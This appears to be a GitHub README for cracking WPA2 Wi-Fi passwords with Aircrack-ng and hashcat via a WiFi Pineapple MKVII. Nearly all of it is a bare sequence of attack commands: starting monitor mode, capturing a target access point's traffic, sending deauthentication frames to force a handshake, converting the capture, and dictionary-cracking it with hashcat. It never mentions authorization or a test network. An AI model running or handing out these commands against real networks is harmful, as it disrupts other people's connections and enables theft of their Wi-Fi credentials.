# Crack_WPA2-WiFi_Pineapple_CLI
Cracking WPA2 using Aircrack-ng through WiFi Pineapple MKVII CLI

### Prerequirments :

- Aircrack-ng : `sudo apt install aircrack-ng`
- WiFi Pineapple MKVII (or any other WiFi Adapter. TIP:Whenever you’re choosing an external Wi-Fi adapter, make sure that it supports both 2.4Ghz and 5Ghz band.

After the Setup
![Setup](images/Setup.jpg)

### Terminal-1
  1. Detect your wireless network interface
     Run:
<pre lang="markdown">iwconfig</pre>

<pre lang="markdown">
sudo apt install aircrack-ng hashcat -y
</pre>

<pre lang="markdown">
ifconfig
</pre>

<pre lang="markdown">
/sbin/ifconfig
</pre>

<pre lang="markdown">
sudo airmon-ng start wlp3s0
</pre>

<pre lang="markdown">
sudo airodump-ng wlp3s0mon
</pre>

<pre lang="markdown">
sudo airodump-ng --bssid 00:11:22:33:44:55 -c 10 --write capture wlp3s0mon
</pre>

<pre lang="markdown">
sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlp3s0mon
</pre>

<pre lang="markdown">
gcc cap2hccapx.c -o cap2hccapx
</pre>

<pre lang="markdown">
./cap2hccapx capture-01.cap capture.hccapx
</pre>

<pre lang="markdown">
hashcat -I
</pre>

<pre lang="markdown">
hashcat -m 2500 capture.hccapx dictionary.txt
</pre>

<pre lang="markdown">
hashcat -m 2500 capture.hccapx dictionary.txt --show
</pre>
